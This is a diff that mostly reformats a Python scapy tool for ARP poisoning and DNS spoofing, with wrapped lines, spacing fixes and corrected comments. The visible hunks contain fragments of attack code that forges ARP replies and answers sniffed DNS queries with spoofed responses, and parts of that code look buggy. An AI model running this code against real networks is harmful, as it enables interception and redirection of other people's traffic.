@@ -60,7 +60,8 @@ def get_interfaces():
     for network, netmask, _, interface, address in scapy.config.conf.route.routes:
 
         # Skip standard interfaces and invalid netmasks.
-        if network == 0 or interface == 'lo' or address == '127.0.0.1' or address == '0.0.0.0' or netmask <= 0 or netmask == 0xFFFFFFFF:
+        if network == 0 or interface == 'lo' or address == '127.0.0.1' or address == '0.0.0.0' or netmask <= 0 \
+                or netmask == 0xFFFFFFFF:
             continue
 
         # Format the net/ip
@@ -100,8 +101,10 @@ def arp_spoof(victim_ip, victim_mac, router_ip, router_mac, attacker_mac=None):
 def arp_restore(victim_ip, victim_mac, router_ip, router_mac):
     logger.info("Starting ARP restoration for " + str(victim_ip))
     sys.stdout = open(os.devnull, 'w')
-    scapy.all.send(scapy.all.ARP(op=2, pdst=router_ip, psrc=victim_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim_mac), count=4)
-    scapy.all.send(scapy.all.ARP(op=2, pdst=victim_ip, psrc=router_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=router_mac), count=4)
+    scapy.all.send(scapy.all.ARP(op=2, pdst=router_ip, psrc=victim_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim_mac),
+                   count=4)
+    scapy.all.send(scapy.all.ARP(op=2, pdst=victim_ip, psrc=router_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=router_mac),
+                   count=4)
     sys.stdout = sys.__stdout__
     logger.info("Restoration successful")
 
@@ -120,6 +123,7 @@ def arp_spoof_stealth(victim_ip, victim_mac, router_ip, attacker_mac=None):
     sys.stdout = sys.__stdout__
 
     dns_spoofing()
+
 
 def arp_poison(victim_ip, victim_mac, router_ip, router_mac, attacker_mac, iterations=100):
     logger.info("Start spoofing network on " + str(victim_ip))
@@ -150,10 +154,10 @@ def arp_poison_stealthy(victim_ip, victim_mac, router_ip, attacker_mac):
     sys.exit(1)
 
 
-#Give the interface of the netwerk, the IP adress to spoof a certain IP, if spoof_all is false.
-def dns_spoofing(interface= "enp0s3", ip = "192.168.56.101", spoof_all = True):
+# Give the interface of the network, the IP address to spoof a certain IP, if spoof_all is false.
+def dns_spoofing(interface, ip, spoof_all=True):
     while 1:
-        dns_packet = scapy.all.sniff(iface=interface, filter ="dst port 53", count = 1)
+        dns_packet = scapy.all.sniff(iface=interface, filter="dst port 53", count=1)
 
         if not spoof_all:
             if ip != dns_packet[scapy.all.IP].src:
@@ -173,12 +177,14 @@ def dns_spoofing(interface= "enp0s3", ip = "192.168.56.101", spoof_all = True):
             spoofed_packet = scapy.all.IP(dst=dns_packet[0].getlayer(scapy.all.IP).src) / \
                              scapy.all.UDP(dport=dns_source_port, sport=dns_packet[0].getlayer(scapy.all.TCP).dport) / \
                              scapy.all.DNS(id=dns_query_id, qr=1, aa=1, qd=dns_packet[0].getlayer(scapy.all.DNS).qd,
-                                           an=scapy.all.DNSRR(rrname=dns_query, ttl=10, rdata=dns_packet[0].getlayer(scapy.all.IP).src))
+                                           an=scapy.all.DNSRR(rrname=dns_query, ttl=10, rdata=dns_packet[0].getlayer(
+                                               scapy.all.IP).src))
             scapy.all.send(spoofed_packet)
         else:
             spoofed_packet = scapy.all.IP(dst=dns_packet[0].getlayer(scapy.all.IP).src) / \
                              scapy.all.UDP(dport=dns_source_port, sport=dns_packet[0].getlayer(scapy.all.UDP).dport) / \
                              scapy.all.DNS(id=dns_query_id, qr=1, aa=1, qd=dns_packet[0].getlayer(scapy.all.DNS).qd,
-                                           an=scapy.all.DNSRR(rrname=dns_query, ttl=10, rdata=dns_packet[0].getlayer(scapy.all.IP).src))
+                                           an=scapy.all.DNSRR(rrname=dns_query, ttl=10, rdata=dns_packet[0].getlayer(
+                                               scapy.all.IP).src))
             scapy.all.send(spoofed_packet)
 
